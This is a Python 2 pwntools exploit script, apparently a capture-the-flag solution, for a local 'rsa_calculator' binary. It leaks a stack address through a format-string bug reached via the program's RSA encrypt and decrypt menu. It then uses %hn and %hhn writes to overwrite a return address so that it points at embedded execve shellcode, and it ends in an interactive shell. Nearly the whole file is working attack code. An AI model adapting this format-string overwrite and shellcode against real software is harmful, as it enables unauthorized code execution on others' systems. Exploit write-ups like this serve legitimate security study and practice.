#! /usr/bin/env python2
# -*- coding: utf-8 -*-

import socket
import telnetlib
import struct
from pwn import *

conn = process('./rsa_calculator')
shellcode = "\x31\xC0\x99\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x53\x54\x5F\x31\xF6\xB0\x3B\x0F\x05"
shell_encrypted = "fb2300006c3e0000882b0000c71f0000ab170000e72c0000341f0000cd2800007c39000042050000c1190000a3090000210c0000c71f0000183f0000202e0000621d0000f32a00000d150000fb23000035220000e83c000013320000013a0000320f0000"

def recvall():
    out = ""
    while True:
        try:
            out += s.recv(1)
        except socket.timeout:
            return out

def recvline(keepends=True):
    return recvuntil('\n', keepends)

def recvlines(numlines, keepends=False):
    b = ""
    for i in xrange(numlines):
        b += recvline(keepends)
    return b

def recv(n=4096):
    b = ""
    while len(b) < n:
        b += s.recv(n - len(b))
    return b

def recvuntil(check, keepends=True):
    b = ""
    while check not in b:
        b += s.recv(1)
    if keepends is False:
        b = b[:-len(check)]
    return b

def sendline(msg):
    s.send(msg + '\n')

def send(msg):
    s.send(msg)

def interactive():
    print 'shell:'
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def setkey():
    conn.sendline('1')
    conn.recvuntil('p : ')
    conn.sendline('101')
    conn.recvuntil('q : ')
    conn.sendline('163')
    conn.recvuntil('e : ')
    conn.sendline('257')
    conn.recvuntil('d : ')
    conn.sendline('3593')
    conn.recvuntil('> ')

def encrypt(pt):
    conn.sendline('2')
    conn.recvuntil(' : ')
    len_pt = len(pt)
    assert len_pt <= 1024
    conn.sendline(str(len_pt))
    conn.recvuntil('data\n')
    conn.sendline(pt)
    conn.recvuntil('(hex encoded) -\n')
    ct = conn.recvline()
    conn.recvuntil('> ')
    return ct

def decrypt(ct):
    conn.sendline('3')
    conn.recvuntil(' : ')
    len_ct = len(ct)
    assert len_ct <= 1024
    conn.sendline(str(len_ct))
    conn.recvuntil('data\n')
    conn.sendline(ct)
    conn.recvuntil('result -\n')
    pt = conn.recvline()
    conn.recvuntil('> ')
    return pt

def run(text):
    return decrypt( encrypt( text ) )

def leak_addr(addr):
    leak = run('%77$s   ' + p64(addr)).split(' ')[0]
    leak = leak + '\x00' * (8 - len(leak))
    return u64(leak)

def pad(p):
    pad = len(p) % 8
    if pad > 0:
        p += ' ' * (8 - pad)
    return p

def main():
    conn.recvuntil('> ')
    setkey()
    #leak = run('%6$p    ')[2:]
    leak = decrypt('76370000651900000f3f0000b90b000008010000080100000801000008010000')[2:] # '%6$p    '
    stack_addr = int(leak, 16)
    print 'stack_leak: ' + hex(stack_addr)
    ret_addr = stack_addr + 0x638 # de RSA_decrypt
    print 'ret_addr: ' + hex(ret_addr)

    # en ret_addr sobreescribo 0x40140a por 0x602580
    payload  = ''
    payload += '%37x'    # 0x25
    payload += '%70$hn'  # byte del medio
    payload += '%59x'    # 0x60
    payload += '%71$hn'  # MSF
    payload += '%32x'    # 0x80
    payload += '%69$hhn' # LSB
    payload  = pad(payload)
    payload += shellcode

    payload  = encrypt(payload)[:-1]

    payload += p64(ret_addr + 0) # LSB
    payload += p64(ret_addr + 1) # byte del medio
    payload += p64(ret_addr + 2) # MSB

    #decrypt(payload)
    conn.sendline('3')
    conn.recvuntil(' : ')
    len_ct = len(payload)
    assert len_ct <= 1024
    conn.sendline(str(len_ct))
    conn.recvuntil('data\n')
    conn.sendline(payload)
    conn.interactive()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass
